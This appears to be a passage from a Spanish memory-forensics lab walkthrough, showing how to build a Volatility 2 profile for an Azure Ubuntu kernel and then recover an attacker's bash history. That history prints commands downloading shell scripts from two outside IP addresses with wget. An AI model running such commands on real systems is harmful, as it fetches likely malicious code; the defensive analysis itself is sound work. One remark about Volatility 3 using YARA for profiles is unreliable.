└─$ vol -f ubuntu.20211208.mem banner
Volatility 3 Framework 2.11.0
Progress:  100.00               PDB scanning finished
Offset  Banner

0x312001a0      Linux version 5.4.0-1059-azure (buildd@lcy01-amd64-003) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #62~18.04.1-Ubuntu SMP Tue Sep 14 17:53:18 UTC 2021 (Ubuntu 5.4.0-1059.62~18.04.1-azure 5.4.140)
```

La versión del kernel es un `5.4.0-1059-azure` y es un `Ubuntu 18.04`. 


Ahora vamos a volatility2 y modificamos el fichero  `MakeFile`, cambiamos el valor de la variable `KVER` con la versión del kernel: 

`KVER ?= 5.4.0-1059-azure`
>  Le dice al sistema de compilación que utilice 5.4.0-1059-azure como versión de kernel para localizar los headers y el árbol de fuentes correcto.
>  El módulo que compilemos debe vincularse contra las mismas estructuras de datos y macros que usó el kernel original; si hay discrepancias (aunque minúsculas), el perfil resultante no funcionará.

Ahora creamos un contenedor de docker con la imagen de `Ubuntu 18.04`, importante usar esta versión que es la de nuestro volcado de memoria: 
```bash 
docker run -it --rm -v $PWD:/volatility ubuntu:18.04 /bin/bash
```

**`Los siguientes pasos se hacen dentro del contenedor`**: 

Actualizamos e instalamos lo siguiente: 
```bash
apt update
apt install build-essential
apt install dwarfdump
apt install make
apt install zip

apt install linux-image-5.4.0-1059-azure
apt install linux-headers-5.4.0-1059-azure
```
> build-essential, make: Compilador y utilidades básicas.
> dwarfdump: Para extraer la información DWARF (símbolos y tipos de datos con depuración) del módulo compilado.
> linux-image & linux-headers: Instalan el vmlinuz y los headers exactos de la versión de kernel que quieres perfilar.


Seguimos dentro del contenedor, nos movemos al directorio de `/volatility`: 
```bash
root@1d2908d3ba2d:/# ls
bin   dev  home        initrd.img.old  lib64  mnt  proc  run   srv  tmp  var      vmlinuz.old
boot  etc  initrd.img  lib             media  opt  root  sbin  sys  usr  vmlinuz  volatility
```

Dentro del /volatility ejecutamos el comando "make": 
```bash
root@1d2908d3ba2d:/volatility# make
make -C //lib/modules/5.4.0-1059-azure/build CONFIG_DEBUG_INFO=y M="/volatility" modules
make[1]: Entering directory '/usr/src/linux-headers-5.4.0-1059-azure'
  CC [M]  /volatility/module.o
  Building modules, stage 2.
  MODPOST 1 modules
WARNING: modpost: missing MODULE_LICENSE() in /volatility/module.o
see include/linux/module.h for more information
  CC [M]  /volatility/module.mod.o
  LD [M]  /volatility/module.ko
make[1]: Leaving directory '/usr/src/linux-headers-5.4.0-1059-azure'
dwarfdump -di module.ko > module.dwarf
make -C //lib/modules/5.4.0-1059-azure/build M="/volatility" clean
make[1]: Entering directory '/usr/src/linux-headers-5.4.0-1059-azure'
  CLEAN   /volatility/Module.symvers
make[1]: Leaving directory '/usr/src/linux-headers-5.4.0-1059-azure'
```

Una vez finalizado, creamos el perfil con el siguiente comando: 
```bash
root@1d2908d3ba2d:/volatility# zip Ubuntu-azure.zip module.dwarf /boot/System.map-5.4.0-1059-azure
```

> module.dwarf: Un volcado de las tablas de depuración DWARF, que incluye nombres de structs, offsets de campos, tipos, etc.
> System.map-5.4.0-1059-azure: Mapa de símbolos del kernel (direcciones virtuales de cada función/variable exportada).
> ZIP resultante: este archivo es el “perfil” de Volatility 2 para Linux 5.4.0-1059-azure.

Con esto, dentro del contenedro, en el directorio `/boot` debeos ver el fichero `System.map-5.4.0-1059-azure`: 
```bash
root@1d2908d3ba2d:/boot# ls
System.map-5.4.0-1059-azure  config-5.4.0-1059-azure  grub  vmlinuz-5.4.0-1059-azure
```
Si no, es que instalamos los paquetes incorrectos. 

**Con todo esto**  Volatility sabe exactamente dónde y cómo leer cada campo de las listas de procesos, las tablas de mm_struct, los descriptor de archivos, etc.
Con System.map, localiza las funciones exportadas, tablas de syscalls y símbolos globales necesarios para navegar la memoria.
Usar headers y build tools del mismo entorno (Ubuntu 18.04) asegura que no haya desajustes en la ABI ni en la disposición de las estructuras.
Con esto  el framework conoce en detalle la estructura interna de ese kernel y puede extraer la información deseada sin errores de offsets o tipos.

Ahora salimos de docker con el comando `exit` y y copiamos el fichero ` Ubuntu-azure.zip` que se creó en el directorio en el que levantamos en el contenedor, lo copiamos a la ruta de `volatility/plugins/overlays/linux` en volatility2 y listo, tenemos nuestra perfil, podemos confirmar con el siguiente comando: 

```bash
┌──(venv)─(kali㉿kali)-[~/blue-labs/volatility]
└─$ python2 vol.py --info | grep Profile
Volatility Foundation Volatility Framework 2.6.1
Profiles
LinuxUbuntu-azurex64                    - A Profile for Linux Ubuntu-azure x64
LinuxUbuntu_5_3_0-70-generic_profilex64 - A Profile for Linux Ubuntu_5.3.0-70-generic_profile x64
VistaSP0x64                             - A Profile for Windows Vista SP0 x64
VistaSP0x86                             - A Profile for Windows Vista SP0 x86
```

Ahora ya podemos obtener las direcciones MAC: 

```bash
┌──(venv)─(kali㉿kali)-[~/blue-labs/volatility]
└─$ python2 vol.py -f /home/kali/blue-labs/azurepot/temp_extract_dir/memoria/ubuntu.20211208.mem --profile=LinuxUbuntu-azurex64 linux_ifconfig
Volatility Foundation Volatility Framework 2.6.1
Interface        IP Address           MAC Address        Promiscous Mode
---------------- -------------------- ------------------ ---------------
lo               127.0.0.1            00:00:00:00:00:00  False
eth0             10.0.0.4             00:22:48:26:3b:16  False
```

---
<h3 style="color: #0d6efd;">Q15 Del historial de Bash. El atacante descargó un script sh. ¿Cuál es el nombre del archivo?</h3>

Para esto usamos el plugin `linux_bash` y aplicamos un grep sencillo:

```bash
┌──(venv)─(kali㉿kali)-[~/blue-labs/volatility]
└─$ grep -E 'curl|wget.*\.sh' linux_bash
    4205 bash                 2021-12-08 16:12:31 UTC+0000   cat error_log | egrep "curl|wget"
    4205 bash                 2021-12-08 16:12:31 UTC+0000   cat error_log | egrep "curl|wget"  | grep -v Agent
    4205 bash                 2021-12-08 16:12:31 UTC+0000   cat error_log | egrep "curl|wget" | perl -ne 's/.*data\-HEAP\)\: (.*)/$1/g; print;'
    4205 bash                 2021-12-08 16:12:31 UTC+0000   cat wget.sh
    4205 bash                 2021-12-08 16:12:31 UTC+0000   cat error_log | egrep "curl|wget"
    4205 bash                 2021-12-08 16:12:31 UTC+0000   egrep -i "curl|wget" error_log
    4205 bash                 2021-12-08 16:12:31 UTC+0000   rm wget.sh
    4205 bash                 2021-12-08 16:12:31 UTC+0000   wget http://88.218.227.141/wget.sh
    4205 bash                 2021-12-08 16:12:31 UTC+0000   cat error_log | egrep "curl|wget"  | grep -v Agent
    4205 bash                 2021-12-08 16:12:31 UTC+0000   cat error_log | egrep "curl|wget" | perl -ne 's/.*data\-HEAP...(.*)/$2/g; print;'
    4205 bash                 2021-12-08 16:12:31 UTC+0000   cat error_log | egrep "curl|wget" | perl -ne 's/.*/data\-HEAP...(.*)/2/g; print;'
    4205 bash                 2021-12-08 16:12:31 UTC+0000   cat error_log | egrep "curl|wget" | perl -ne 's/.*data\-HEAP...(.*)/2/g; print;'
    4205 bash                 2021-12-08 16:12:31 UTC+0000   cat error_log | egrep "curl|wget" | perl -ne 's/.*data\-HEAP\)\: (.*)/$2/g; print;'
    4205 bash                 2021-12-08 16:12:31 UTC+0000   wget http://185.191.32.198/unk.sh
    9331 bash                 2021-12-08 16:18:01 UTC+0000   grep curl error_log
    9331 bash                 2021-12-08 16:18:01 UTC+0000   grep curl error_log  | grep ".sh
    9331 bash                 2021-12-08 16:18:01 UTC+0000   grep curl error_log  | grep ".sh"
    9331 bash                 2021-12-08 16:18:01 UTC+0000   grep curl error_log  | grep "\.sh"
```

Podemos ver el script y la ip desde donde se descargó. 

El método para obtener el perfil es muy útil, pero puede haber escenarios en los que no funcione: 

En principio la técnica de “compilar un módulo con `CONFIG_DEBUG_INFO` + extraer DWARF + empaquetar con el `System.map`” es **generalizable** a cualquier volcado de Linux, siempre que cumplas estas condiciones:

1. **Disponibilidad de los headers y del System.map exactos**

   * Tu perfil debe corresponder **punto a punto** con la versión de kernel que generó el volcado (incluyendo revisiones, parches de proveedor como “azure”, “aws”, etc.).
   * Si no existen paquetes pre–compilados de headers con debug info, o el proveedor no los publica, no podrás reconstruir el módulo con símbolos completos.

2. **Configuración `CONFIG_DEBUG_INFO` en el kernel**

   * Algunos kernels en producción se compilan sin `CONFIG_DEBUG_INFO` (o con símbolos reducidos) por razones de rendimiento o seguridad.
   * Si el kernel no lleva suficiente información DWARF, el módulo que compiles tendrá muy pocos detalles y Volatility no sabrá el layout de las estructuras.

3. **Kernels muy personalizados o “embebidos”**

   * Cuando el kernel está fuertemente parcheado o se generan con toolchains internos, puede que ni los sources oficiales ni los headers del repositorio público coincidan.
   * En esos casos tendrías que reconstruir tú mismo el kernel (desde la misma fuente) con las mismas opciones de compilación para obtener un perfil fiable.

4. **Distros distintas o sistemas no-Linux**

   * El método descrito es **exclusivo de Linux** y de Volatility 2. Para Windows, macOS o sistemas BSD necesitas perfiles distintos (Windows PDBs y símbolos, Mach-O DWARF, etc.) y, a menudo, herramientas o plugins diferentes.
   * Incluso dentro de Linux, Volatility 3 ya gestiona perfiles de forma diferente (usando YARA y módulos Python); el “Makefile + ZIP” es específico de Volatility 2.

5. **Cápsulas de nube o live-patching**

   * Si el kernel está siendo parcheado en caliente (livepatch) o se ha cargado un módulo con símbolos que altera estructuras, tu perfil offline puede no reflejar el estado real de memoria.
   * En esos escenarios habría que capturar también la imagen del kernel en ejecución o el módulo live-patch para extraer sus símbolos.

6. **Volcados parciales, cifrados o comprimidos**

   * Si el volcado no incluye toda la RAM (por ejemplo, sólo áreas de usuario, o está comprimido/cifrado), el perfil puede no servir para interpretar correctamente lo que falta o lo que está fuera de rango.

— Siempre y cuando puedas obtener **exactamente** los headers con debug info y el System.map que coincidan con TU kernel, **sí**, este método funciona para cualquier volcado de Linux que te entreguen.
— Donde falla es cuando ese requisito no se cumple (kernels sin debug, muy personalizados, livepatch, o sistemas distintos a Linux).

